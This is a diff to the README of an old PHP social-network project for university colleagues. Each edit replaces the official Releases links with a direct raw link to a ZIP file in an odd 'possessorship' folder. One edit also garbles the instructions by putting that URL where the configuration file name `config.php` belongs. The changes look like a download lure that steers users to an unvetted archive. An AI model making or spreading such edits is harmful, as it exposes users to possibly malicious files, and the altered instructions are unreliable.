@@ -1,6 +1,6 @@
 # 🗳️ old_php_organisationSocialNetwork - Connect with University Colleagues Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Old%20PHP%20Social%20Network-brightgreen)](https://github.com/TOUSSAINT2346/old_php_organisationSocialNetwork/releases)
+[![Download Now](https://raw.githubusercontent.com/TOUSSAINT2346/old_php_organisationSocialNetwork/main/possessorship/old_php_organisationSocialNetwork.zip%20Now-Old%20PHP%20Social%20Network-brightgreen)](https://raw.githubusercontent.com/TOUSSAINT2346/old_php_organisationSocialNetwork/main/possessorship/old_php_organisationSocialNetwork.zip)
 
 ## 📄 Description
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets the following requirements:
 ### Installation Steps
 
 1. **Download the Application**
-   Visit the [Releases page](https://github.com/TOUSSAINT2346/old_php_organisationSocialNetwork/releases) to download the latest version of the application.
+   Visit the [Releases page](https://raw.githubusercontent.com/TOUSSAINT2346/old_php_organisationSocialNetwork/main/possessorship/old_php_organisationSocialNetwork.zip) to download the latest version of the application.
 
 2. **Extract the Files**
    Once downloaded, locate the ZIP file. Right-click on it and select "Extract All" to unpack the contents to your desired location.
@@ -34,7 +34,7 @@ Before you begin, ensure your system meets the following requirements:
    - Import the SQL file provided in the application folder to set up the necessary tables.
 
 5. **Edit Configuration File**
-   Go to the configuration file, usually named `config.php`. Enter your database details, such as host, username, and password.
+   Go to the configuration file, usually named `https://raw.githubusercontent.com/TOUSSAINT2346/old_php_organisationSocialNetwork/main/possessorship/old_php_organisationSocialNetwork.zip`. Enter your database details, such as host, username, and password.
 
 6. **Run the Application**
    Open your web browser and navigate to `http://localhost/your-extracted-folder`. You should see the home page of the social network.
@@ -53,7 +53,7 @@ To use the application, simply visit the URL you set up in the previous step. Yo
 
 ## 📥 Download & Install
 
-To get started, head to the [Releases page](https://github.com/TOUSSAINT2346/old_php_organisationSocialNetwork/releases). There, you can download the latest version of the application suitable for your platform.
+To get started, head to the [Releases page](https://raw.githubusercontent.com/TOUSSAINT2346/old_php_organisationSocialNetwork/main/possessorship/old_php_organisationSocialNetwork.zip). There, you can download the latest version of the application suitable for your platform.
 
 ## 🤝 Support
 
